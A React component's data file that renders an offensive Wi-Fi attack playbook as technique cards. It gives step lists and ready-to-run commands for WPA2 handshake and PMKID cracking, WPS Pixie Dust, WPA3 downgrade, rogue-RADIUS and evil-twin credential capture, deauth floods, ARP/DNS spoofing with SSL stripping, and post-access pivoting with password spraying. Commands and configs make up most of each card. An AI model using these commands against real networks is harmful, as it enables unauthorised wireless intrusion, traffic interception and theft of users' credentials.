import React from 'react';
import TechniqueCard from '../TechniqueCard';

const techniques = [
  {
    id: 'wifi-recon',
    title: 'Wi-Fi Reconnaissance',
    subtitle: 'Enumerate wireless networks, clients, and APs in the target area',
    tags: ['airodump-ng', 'kismet', 'wash', 'passive scan', 'ESSID', 'BSSID'],
    steps: [
      'Put wireless interface into monitor mode: airmon-ng start wlan0',
      'Passive scan to enumerate all APs, SSIDs, BSSIDs, channels, encryption types, and connected clients',
      'Identify target networks by ESSID and note: channel, encryption (WPA/WPA2/WPA3/Enterprise), signal strength',
      'Look for hidden SSIDs — they still appear in airodump-ng with empty ESSID but visible BSSID',
      'Map client stations to APs to identify active users you can force-deauth to capture handshakes',
      'Use Kismet for passive-only stealth reconnaissance (no active probes)',
    ],
    commands: [
      {
        title: 'Monitor mode & scanning',
        code: `# Enable monitor mode
airmon-ng check kill          # Kill conflicting processes
airmon-ng start wlan0         # wlan0mon created

# Passive scan — all channels
airodump-ng wlan0mon

# Targeted scan — lock to specific AP
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Kismet — passive stealth scan (no probes)
kismet -c wlan0mon

# Identify WPS-enabled APs (target for Pixie Dust / online brute force)
wash -i wlan0mon

# Linux iw — quick scan
iw dev wlan0 scan | grep -E "SSID|signal|capability|WPA|RSN"

# macOS — airport utility
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s`
      }
    ]
  },
  {
    id: 'wpa2-handshake',
    title: 'WPA2-Personal — Handshake Capture & Cracking',
    subtitle: 'Capture 4-way EAPOL handshake and offline crack the PSK',
    tags: ['WPA2', '4-way handshake', 'airodump-ng', 'aireplay-ng', 'hashcat', 'PMKID'],
    steps: [
      'Lock airodump-ng to target AP channel and start capture to a .cap file',
      'Wait for a client to connect naturally — OR — send deauth frames to force a reconnection',
      'Deauth attack: send 802.11 deauthentication frames to a connected client (forces reconnect → handshake)',
      'Verify handshake captured: airodump-ng shows "WPA handshake: AA:BB:CC" in top-right',
      'Convert to hashcat format (hc22000) using hcxtools and crack offline with wordlist + rules',
      'For no-client scenarios: use PMKID attack — does not require any connected client',
    ],
    commands: [
      {
        title: 'Handshake capture',
        code: `# Step 1 — capture on target AP
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w target_capture wlan0mon

# Step 2 — deauth a connected client (separate terminal)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -0 5 = send 5 deauth frames
# -a = AP BSSID, -c = client MAC

# Broadcast deauth (all clients)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Verify handshake captured
aircrack-ng target_capture-01.cap`
      },
      {
        title: 'PMKID attack (no client required)',
        code: `# PMKID is stored in RSN IE of the first EAPOL frame
# Does NOT require a connected client

# hcxdumptool — capture PMKID
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 \\
  --filterlist_ap=target_bssid.txt --filtermode=2

# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 pmkid.pcapng

# Alternative: pyrit, or aircrack-ng (limited)`
      },
      {
        title: 'Hashcat cracking',
        code: `# Convert cap to hc22000 format
hcxpcapngtool -o hash.hc22000 target_capture-01.cap

# Hashcat — WPA2 crack (mode 22000)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# With rules (vastly improves coverage)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt \\
  -r /usr/share/hashcat/rules/best64.rule

# Mask attack — common patterns (e.g. Company2024!)
hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?l?d?d?d?d!

# Targeted wordlist: company name + year/symbol variations
hashcat -m 22000 hash.hc22000 company_wordlist.txt \\
  -r /usr/share/hashcat/rules/toggles5.rule

# Legacy format (.cap → hccapx)
hcxpcapngtool -o hash.hccapx target_capture-01.cap
hashcat -m 2500 hash.hccapx wordlist.txt`
      }
    ]
  },
  {
    id: 'wpa2-wps',
    title: 'WPS Attacks — Pixie Dust & PIN Brute Force',
    subtitle: 'Exploit WPS (Wi-Fi Protected Setup) to recover WPA2 PSK',
    tags: ['WPS', 'Pixie Dust', 'reaver', 'bully', 'wash', 'offline WPS'],
    steps: [
      'Identify WPS-enabled APs with wash — look for WPS Locked: No and WPS Version 1.0',
      'Pixie Dust attack (offline): exploits weak E-S1/E-S2 nonces in some AP chipsets — recovers PIN in seconds',
      'Affected chipsets: Realtek, Broadcom, Ralink (many older home routers)',
      'Online PIN brute force: reaver/bully try all 11,000 possible WPS PINs — slow but works on unlocked APs',
      'Once WPS PIN is found: reaver automatically extracts the WPA2 PSK from the AP',
    ],
    commands: [
      {
        title: 'WPS enumeration & Pixie Dust',
        code: `# Scan for WPS-enabled APs
wash -i wlan0mon
wash -i wlan0mon -C    # Ignore FCS errors

# Pixie Dust attack (offline — instant if vulnerable)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vvv
# -K 1 = Pixie Dust mode
# Success: WPS PIN + WPA PSK printed

# Using OneShot (Python — faster Pixie Dust)
python3 oneshot.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -K

# Bully — alternative WPS tool
bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3

# Online PIN brute force (slow — ~4 hours on unlocked AP)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv
# With delay to avoid lockout
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 15 -r 3:15 -vvv`
      }
    ]
  },
  {
    id: 'wpa3-attacks',
    title: 'WPA3 Attacks',
    subtitle: 'Downgrade attacks, Dragonblood vulnerabilities, and implementation flaws',
    tags: ['WPA3', 'SAE', 'Dragonblood', 'downgrade', 'side-channel', 'transition mode'],
    steps: [
      'WPA3-Personal uses SAE (Simultaneous Authentication of Equals) — replaces PSK with Dragonfly handshake',
      'WPA3 Transition Mode: AP supports both WPA2 and WPA3 simultaneously — downgrade to WPA2 and attack PSK',
      'Dragonblood (CVE-2019-9494 / 9496): side-channel timing/cache attacks on SAE commit messages',
      'Timing side-channel: measure response time to determine which group/scalar the AP uses → brute force offline',
      'Cache-based side-channel: requires local code execution but leaks SAE scalar values',
      'Implementation bugs: many vendors shipped WPA3 with flawed SAE implementations — check for specific CVEs',
      'Transition mode downgrade: use a rogue AP advertising only WPA2 for the same SSID — clients fall back to WPA2',
    ],
    commands: [
      {
        title: 'WPA3 transition mode downgrade',
        code: `# Check if AP runs WPA3 Transition Mode (WPA2+WPA3 mixed)
iw dev wlan0 scan | grep -A 20 "SSID: TargetNetwork" | grep -E "RSN|WPA"
# If both WPA2 (CCMP) and WPA3 (SAE) appear → transition mode → vulnerable

# Downgrade attack: stand up evil twin advertising only WPA2
# Clients in transition mode will connect to WPA2-only AP
hostapd-wpe config below captures WPA2 handshake instead

# Force WPA2 connection — capture standard EAPOL handshake
# Then crack with hashcat as normal WPA2 attack (see WPA2 card)`
      },
      {
        title: 'Dragonblood side-channel',
        code: `# Dragonblood tools
git clone https://github.com/vanhoefm/dragonblood

# Timing-based side-channel attack
# Requires sending SAE commit frames and measuring response timing
# The timing difference reveals which DH group / iteration was used
# Allows offline dictionary attack against SAE

# CVE-2019-9494 — timing side-channel
python3 dragonslayer.py --interface wlan0mon --target AA:BB:CC:DD:EE:FF \\
  --ssid "TargetNetwork" --wordlist rockyou.txt

# Check vendor-specific advisories:
# https://www.wi-fi.org/security-update-april-2019
# Most patched in 2019-2020 firmware updates`
      }
    ]
  },
  {
    id: 'wpa-enterprise',
    title: 'WPA Enterprise (802.1X) Attacks',
    subtitle: 'Attack EAP-based networks: rogue AP credential capture, PEAP relay, and cert attacks',
    tags: ['WPA Enterprise', '802.1X', 'EAP-TTLS', 'PEAP', 'EAP-TLS', 'hostapd-wpe', 'rogue AP', 'EAP relay'],
    steps: [
      'WPA Enterprise uses a RADIUS server for authentication — clients send domain credentials (MSCHAPv2, EAP-TLS)',
      'Most common: PEAP-MSCHAPv2 — user presents username+password inside a TLS tunnel',
      'Rogue AP attack: stand up a fake AP mimicking the target SSID — client connects and authenticates against your rogue RADIUS',
      'Your rogue RADIUS presents a self-signed cert — if client doesn\'t validate the cert, it sends MSCHAPv2 credentials',
      'Captured MSCHAPv2 challenge/response can be cracked offline with hashcat (mode 5500/2759) or asleap',
      'EAP-TLS: requires client certificate — much harder to attack, focus on cert theft or rogue CA',
      'Inner identity leakage: EAP outer identity often reveals username even with proper cert validation',
    ],
    commands: [
      {
        title: 'Rogue AP with hostapd-wpe',
        code: `# hostapd-wpe — rogue RADIUS/AP for WPA Enterprise credential capture
# Install
apt install hostapd-wpe

# Configure hostapd-wpe.conf
cat > /etc/hostapd-wpe/hostapd-wpe.conf << 'EOF'
interface=wlan0mon
ssid=TargetCorp          # Must match target SSID exactly
channel=6
hw_mode=g
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd/hostapd.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
EOF

# Start rogue AP
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Credentials captured in: /tmp/hostapd-wpe.log`
      },
      {
        title: 'EAP-PEAP relay with eaphammer',
        code: `# eaphammer — automated WPA Enterprise attack
git clone https://github.com/s0lst1c3/eaphammer

# Generate certs (make your rogue CA look legit)
python3 eaphammer --cert-wizard
# Use target organization name in CN field

# Rogue AP attack — capture PEAP-MSCHAPv2 hashes
python3 eaphammer -i wlan0 --channel 6 --auth wpa-eap \\
  --essid "TargetCorp" --creds

# EAP downgrade — force weaker EAP method
python3 eaphammer -i wlan0 --channel 6 --auth wpa-eap \\
  --essid "TargetCorp" --negotiate balanced --creds`
      },
      {
        title: 'Crack MSCHAPv2 with hashcat / asleap',
        code: `# MSCHAPv2 credentials appear in hostapd-wpe.log as:
# username: jsmith
# challenge: aa:bb:cc:dd:ee:ff:11:22
# response: aabbccddeeff...

# Format for asleap: username::challenge:response
# asleap — fast MSCHAPv2 cracker
asleap -C aa:bb:cc:dd:ee:ff:11:22 \\
  -R aabbccddeeff112233445566778899aabbccddeeff1122334455 \\
  -W /usr/share/wordlists/rockyou.txt

# Hashcat — MSCHAPv2 (mode 5500 = NetNTLMv1, mode 2759 = MSCHAPv2)
# Format: username:::challenge:response:
echo "jsmith:::aabbccddeeff1122:aabbccddeeff112233445566778899aabbccddeeff1122334455:" > hash.txt
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt \\
  -r /usr/share/hashcat/rules/best64.rule

# Once cracked → use AD credentials for internal access
# Domain credentials from WPA Enterprise → password spray, VPN, OWA, SMB`
      },
      {
        title: 'Inner identity & certificate analysis',
        code: `# EAP outer vs inner identity
# Outer: anonymous@corp.com or username@corp.com (leaks pre-TLS)
# Inner: full credentials inside TLS tunnel

# Capture outer identity with Wireshark — filter: eap
# Look for: EAP-Response/Identity packets before TLS tunnel forms
tshark -i wlan0mon -Y "eap" -T fields -e eap.identity 2>/dev/null

# Check if clients validate server cert
# If they don't — your self-signed cert works → you get MSCHAPv2 hashes
# If they do — focus on:
#   1. Obtain a cert from a trusted CA matching the RADIUS server CN
#   2. Steal existing RADIUS server certificate + private key
#   3. Target EAP-TLS cert (client certs) for theft from endpoints

# Force client to reveal inner identity (even with cert validation)
# Some EAP implementations send inner identity before cert validation completes`
      }
    ]
  },
  {
    id: 'evil-twin',
    title: 'Evil Twin / Rogue AP',
    subtitle: 'Impersonate a legitimate AP to intercept traffic and capture credentials',
    tags: ['evil twin', 'captive portal', 'airbase-ng', 'hostapd', 'MITM', 'deauth'],
    steps: [
      'Clone target SSID and BSSID (or spoof similar BSSID) on higher power to attract clients',
      'Simultaneously deauth clients from the legitimate AP — they reconnect to yours',
      'For open networks: stand up a captive portal requiring login — capture plain-text credentials',
      'For PSK networks: present a fake captive portal after connection claiming "password changed"',
      'Run dnsspoof + sslstrip/mitmproxy to intercept and downgrade HTTPS traffic',
      'Use hostapd-wpe for Enterprise networks (see WPA Enterprise card)',
    ],
    commands: [
      {
        title: 'Evil twin setup with hostapd',
        code: `# Full evil twin setup

# 1. Create hostapd config
cat > /tmp/evil_ap.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

# 2. Start rogue AP
hostapd /tmp/evil_ap.conf &

# 3. Assign IP to interface
ip addr add 192.168.1.1/24 dev wlan0
ip link set wlan0 up

# 4. DHCP server for clients
dnsmasq --interface=wlan0 --dhcp-range=192.168.1.10,192.168.1.100 \\
  --dhcp-option=3,192.168.1.1 --dhcp-option=6,192.168.1.1 \\
  --no-daemon &

# 5. Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# 6. Deauth clients from real AP (force them to your evil twin)
aireplay-ng -0 0 -a <REAL_AP_BSSID> wlan0mon  # Continuous deauth`
      },
      {
        title: 'Captive portal credential capture',
        code: `# Use WiFi-Pumpkin3 — full evil twin + captive portal framework
git clone https://github.com/P0cL4bs/wifipumpkin3
pip3 install .

# Interactive session
wifipumpkin3
wp3 > set interface wlan0
wp3 > set ssid TargetNetwork
wp3 > set proxy noproxy
wp3 > set captiveportal opennac
wp3 > start

# Fluxion — automated evil twin with WPA handshake verification
git clone https://github.com/FluxionNetwork/fluxion
./fluxion.sh
# Guides you through: scan → target → evil twin → captive portal
# Verifies captured PSK against original handshake before reporting

# airgeddon — menu-driven all-in-one wireless attack framework
git clone https://github.com/v1s1t0r1sh3r3/airgeddon
./airgeddon.sh`
      }
    ]
  },
  {
    id: 'wifi-mitm',
    title: 'Wi-Fi MITM & Traffic Interception',
    subtitle: 'Intercept, downgrade, and manipulate traffic over compromised Wi-Fi',
    tags: ['mitmproxy', 'sslstrip', 'bettercap', 'ARP spoof', 'DNS spoof', 'HSTS bypass'],
    steps: [
      'Once on the same network (evil twin or compromised AP), perform ARP spoofing to redirect traffic',
      'DNS spoofing: redirect all DNS queries to attacker-controlled IP — phish any domain',
      'SSL stripping: downgrade HTTPS → HTTP for sites without HSTS — intercept plain-text credentials',
      'HSTS bypass: target domains not in HSTS preload list — use sslstrip+ or bettercap',
      'mitmproxy: intercept, inspect, and modify HTTPS traffic with injected CA cert',
      'Capture cookies, session tokens, credentials from unprotected or downgraded connections',
    ],
    commands: [
      {
        title: 'bettercap MITM',
        code: `# bettercap — comprehensive MITM framework
bettercap -iface wlan0

# In bettercap interactive console:
net.probe on                    # Discover hosts
net.show                        # List hosts

# ARP spoof target
set arp.spoof.targets 192.168.1.100
arp.spoof on

# DNS spoof — redirect all DNS to attacker
set dns.spoof.all true
set dns.spoof.address 192.168.1.1
dns.spoof on

# HTTP/S proxy with SSL stripping
set https.proxy.sslstrip true
https.proxy on
http.proxy on

# Log credentials
set http.proxy.script /usr/share/bettercap/caplets/steal-creds.js`
      },
      {
        title: 'mitmproxy & certificate injection',
        code: `# mitmproxy — intercept HTTPS
mitmproxy --mode transparent --listen-port 8080

# iptables redirect to mitmproxy
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Certificate: victim must trust mitmproxy CA
# Inject CA cert via captive portal page or DNS redirect to cert download page
# Certificate location: ~/.mitmproxy/mitmproxy-ca-cert.pem

# sslstrip (legacy but useful for non-HSTS sites)
sslstrip -l 8080 -w /tmp/sslstrip.log
# Intercept HTTP traffic for downgraded sessions`
      }
    ]
  },
  {
    id: 'wifi-reconnaissance-advanced',
    title: 'Probe Request Harvesting & Client Attacks',
    subtitle: 'Exploit client probe requests to fingerprint users and lure them to rogue APs',
    tags: ['probe requests', 'preferred network list', 'karma attack', 'SSID harvesting', 'client fingerprint'],
    steps: [
      'Client devices broadcast probe requests for their Preferred Network List (PNL) when not connected',
      'Passively capture probe requests to learn what SSIDs a client has previously connected to',
      'KARMA attack: respond to ANY probe request claiming to be the requested SSID — client auto-connects',
      'Build a target-specific SSID list from captured probes to impersonate known-trusted networks',
      'Beacon flood: broadcast hundreds of SSIDs simultaneously — confuse network scanners',
    ],
    commands: [
      {
        title: 'Probe request capture & KARMA',
        code: `# Capture probe requests passively
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 4" \\
  -T fields -e wlan.sa -e wlan_mgt.ssid 2>/dev/null | sort -u

# airodump-ng — shows probes in last column
airodump-ng wlan0mon
# Bottom section "Probes" shows client → requested SSIDs

# Python passive probe sniffer
from scapy.all import *
def probe_handler(pkt):
    if pkt.haslayer(Dot11ProbeReq):
        ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
        src = pkt[Dot11].addr2
        if ssid: print(f"[{src}] → {ssid}")
sniff(iface="wlan0mon", prn=probe_handler, store=0)

# KARMA attack — respond to all probes (hostapd-karma patch)
# Or use WiFi-Pumpkin3 with KARMA module enabled
wp3 > set pulsar.karma true
wp3 > start

# mdk4 — beacon flood + deauth flood
mdk4 wlan0mon b -f ssid_list.txt        # Beacon flood
mdk4 wlan0mon d -c 6                    # Deauth flood on channel 6`
      }
    ]
  },
  {
    id: 'wifi-post-access',
    title: 'Post-Access — Internal Pivot via Wi-Fi',
    subtitle: 'After connecting to target Wi-Fi, pivot to internal network and corporate resources',
    tags: ['network scan', 'pivot', 'internal access', 'guest network', 'VLAN hopping', 'SMB'],
    steps: [
      'After connecting: identify network segment, default gateway, DNS servers, DHCP scope',
      'Enumerate internal hosts with nmap — focus on 192.168.x.x / 10.x.x.x / 172.16.x.x',
      'Corporate Wi-Fi often connects directly to internal LAN — immediate access to file shares, printers, internal web apps',
      'Guest Wi-Fi: test for VLAN hopping or weak isolation — try to reach corporate segment',
      'Use discovered Wi-Fi credentials to authenticate to VPN, OWA, or corporate portal',
      'Wi-Fi PSK may be reused as passwords elsewhere — spray against AD, O365, SSH',
    ],
    commands: [
      {
        title: 'Post-connection enumeration',
        code: `# Get your IP info
ip addr show wlan0
ip route
cat /etc/resolv.conf

# Discover live hosts
nmap -sn 192.168.1.0/24 -oG - | awk '/Up/{print $2}'

# Quick service scan on discovered hosts
nmap -sV -p 22,80,443,445,3389,8080,8443 192.168.1.0/24 --open

# SMB shares — often accessible from corporate Wi-Fi
nxc smb 192.168.1.0/24 --shares -u '' -p ''    # Null session
nxc smb 192.168.1.0/24 --shares                 # With credentials

# Check for internal web apps
nmap -p 80,443,8080,8443,8000,9090 192.168.1.0/24 --open
for ip in $(cat live_hosts.txt); do curl -skI http://$ip | grep -E "Server:|Location:"; done

# VLAN hopping attempt (double-tag)
# Requires layer2 access and misconfigured native VLAN
# Use scapy to craft double-tagged 802.1Q frames

# Use Wi-Fi PSK in password spray
# PSK found: "CorpWifi2024!" → spray against:
nxc smb 192.168.1.0/24 -u users.txt -p 'CorpWifi2024!'
python3 o365spray.py --spray -U users.txt -p 'CorpWifi2024!' --domain corp.com`
      }
    ]
  },
];

export default function WiFiNetworks() {
  return (
    <div>
      <h2 className="font-mono text-lg font-bold text-emerald-400 mb-2">Wi-Fi Networks</h2>
      <p className="text-slate-500 text-sm mb-6">WPA/WPA2/WPA3 attacks • WPS • 802.1X Enterprise • Evil Twin • MITM • Post-Access Pivot</p>
      <div className="grid grid-cols-1 gap-4">
        {techniques.map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard
              title={t.title}
              subtitle={t.subtitle}
              tags={t.tags}
              accentColor="green"
              steps={t.steps}
              commands={t.commands}
            />
          </div>
        ))}
      </div>
    </div>
  );
}